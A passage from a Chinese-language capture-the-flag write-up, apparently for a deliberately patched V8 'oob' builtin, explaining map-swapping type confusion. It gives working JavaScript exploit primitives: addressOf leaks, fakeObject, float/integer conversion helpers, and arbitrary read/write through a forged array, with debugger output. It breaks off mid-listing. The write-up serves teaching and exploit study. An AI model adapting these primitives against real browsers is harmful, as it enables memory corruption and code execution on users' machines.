> 为kArrayOob类型做了与实现函数的关联：
    src/builtins/builtins-definitions.h
    +  CPP(ArrayOob)                                                                \
    /src/compiler/typer.cc
           return Type::Receiver();
         case Builtins::kArrayUnshift:
           return t->cache_->kPositiveSafeInteger;
    +    case Builtins::kArrayOob:
    +      return Type::Receiver();
## 漏洞利用
###  类型混淆
由于v8完全依赖Map类型对js对象进行解析。
所以，我们通过修改对象的map，将对象数组的map设置为浮点数组的map，就能让v8解析原来的对象数组的时候，解析成为浮点数组，反之同理。由于两种数组内部存储的不同，可以实现一些小功能。
  * 对象数组存储的是每个对象的地址，也就是对象数组存的是地址。
  * 浮点数组存储的是浮点型是的数值。
####  addressOf
> 泄露某个对象的内存地址，日后可以实现任意地址读的功能。
因为对象数组存储的是地址，但是如果v8解析是对象数组的话，肯定就不会输出这个地址，而是找到这个对象再操作。但是，如果，让v8误以为这是一个浮点数组，那么，v8就把把这个地址当作是浮点数，以浮点数的形式将对象数组里面存储的对象地址输出了。
所以，步骤如下：
1.拿到要泄漏的地址
2.把这个地址，覆盖已经创建好的对象数组第一个元素obj_array[0]（让地址成为对象数组的一员）
3.将对象数组的map替换为浮点数组的map
4.输出数组的第一个元素，此时，就会按照浮点形式，将地址里的内容输出出来。
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
####  fakeObject
> 将指定内存地址强制转换为一个js对象，日后可以实现任意地址写的功能。
现在，有了地址，地址是一个整数，整数可以直接变成以浮点数表示，但是不能变成对象，所以还是需要混淆。
步骤：
1.拿到地址，转换为浮点数表示。
2.放入浮点数组第一个位置中。
3.将浮点数组的map替换为对象数组的map
4.数组的第一个位置上，内存地址就已经变成一个js对象了。
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
####  辅助的工具函数
浮点数转整数、整数转浮点数、字节串表示整数
实现方法：开辟一块空间，创建两个数组，分别是浮点数组float64和整数数组bigUint64，他们公用创造的那块空间。
这样，根据原来的形式放入对应的数组，用转换的数组输出即可。
例如：f2i()，要将浮点数转换为整数，只要将浮点数放入浮点数组，然后用整数数组输出，因为空间是一个，所以，输入输出的是同一个值，但由于数组的属性不同，会按数组的属性进行解释，进来的时候是浮点数，比如存入了0001H单元，然后输出的时候，还会读这个0001H单元，但是这个时候，用的是整数数组，所以会把它以整数的格式输出。
    var buf =new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
整合在一起调试：
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    // 泄露某个object的地址
    function addressOf(obj_to_leak)
    {
        obj_array[0] = obj_to_leak;
        obj_array.oob(float_array_map);
        let obj_addr = f2i(obj_array[0]) - 1n;//泄漏出来的地址-1才是真实地址
        obj_array.oob(obj_array_map); // 还原array类型以便后续继续使用
        return obj_addr;
    }
    function fakeObject(addr_to_fake)
    {
        float_array[0] = i2f(addr_to_fake + 1n);//地址需要+1才是v8中的正确表达方式
        float_array.oob(obj_array_map);
        let faked_obj = float_array[0];
        float_array.oob(float_array_map); // 还原array类型以便后续继续使用
        return faked_obj;
    }
    // ××××××××3. 测试××××××××
    var test_obj = {};
    %DebugPrint(test_obj);
    var test_obj_addr = addressOf(test_obj);
    console.log("[*] leak object addr: 0x" + hex(test_obj_addr));
    %SystemBreak();
    pwndbg> r
    [...]
    0x189f4fdcf201 
    [*] leak object addr: 0x0000189f4fdcf200
成功泄漏对象的地址。同样，利用fakeObject可以将某个内存地址转换为一个object对象。
###  任意地址读写
>
> 我们首先构造一个假的数组对象，我们可以用fakeObject将其转换为一个object对象。因为自己构造的elements指针是可控的，而这个指针是指向存储数组元素内容的内存地址。所以，只要在elements上放入我们想要读写的地址，就可以用对象进行读写操作了。
步骤：
1.利用可控内存，伪造自己的对象结构。
2.将自己伪造的对象结构转换为真的对象。
我们伪造的是一个对象在内存中的表示，只有这样，elements才是我们自己可以填的。通过addressOf找到是，伪造的对象数组在内存中的地址，也就是他的对象结构开头，真实存储的内容在
**泄漏的地址-伪造的长度（6×0x8）** ，然后我们要让v8认为真实存储的内容是一个对象，所以对 **泄漏的地址-伪造的长度（6×0x8）**
做fakeObject，那么，我们构造的这个数组，就真的成为了一个对象在内存的表示。
3.任意地址读。给定的地址是要读的地址，elements在读写的数据-0x10。把这个伪造的elements给伪造的内存，然后利用上述第二步，变成一个对象（fake_object是用fake_array出来的），读取对象的元素，就是地址的内容了。
4.任意地址写也是一样。把地址变成一个对象，那么要写入的地址就是我们对象的数据了。
    // read & write anywhere
    // 这是一块我们可以控制的内存
    var fake_array = [                //伪造一个对象
        float_array_map,
        i2f(0n),
        i2f(0x41414141n),// fake obj's elements ptr
        i2f(0x1000000000n),
        1.1,
        2.2,
    ];
    // 获取到这块内存的地址
    var fake_array_addr = addressOf(fake_array);
    // 将可控内存转换为对象
    var fake_object_addr = fake_array_addr - 0x30;
    var fake_object = fakeObject(fake_object_addr);
    // 任意地址读
    function read64(addr)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        let leak_data = f2i(fake_object[0]);
        return leak_data;
    }
    // 任意地址写
    function write64(addr, data)
    {
        fake_array[2] = i2f(addr - 0x10n + 0x1n);
        fake_object[0] = i2f(data);    
    }
整合测试一下：
    // ××××××××1. 无符号64位整数和64位浮点数的转换代码××××××××
    var buf = new ArrayBuffer(16);
    var float64 = new Float64Array(buf);
    var bigUint64 = new BigUint64Array(buf);
    // 浮点数转换为64位无符号整数
    function f2i(f)
    {
        float64[0] = f;
        return bigUint64[0];
    }
    // 64位无符号整数转为浮点数
    function i2f(i)
    {
        bigUint64[0] = i;
        return float64[0];
    }
    // 64位无符号整数转为16进制字节串
    function hex(i)
    {
        return i.toString(16).padStart(16, "0");
    }
    // ××××××××2. addressOf和fakeObject的实现××××××××
    var obj = {"a": 1};
    var obj_array = [obj];
    var float_array = [1.1];
    var obj_array_map = obj_array.oob();//oob函数出来的就是map
    var float_array_map = float_array.oob();
    // 泄露某个object的地址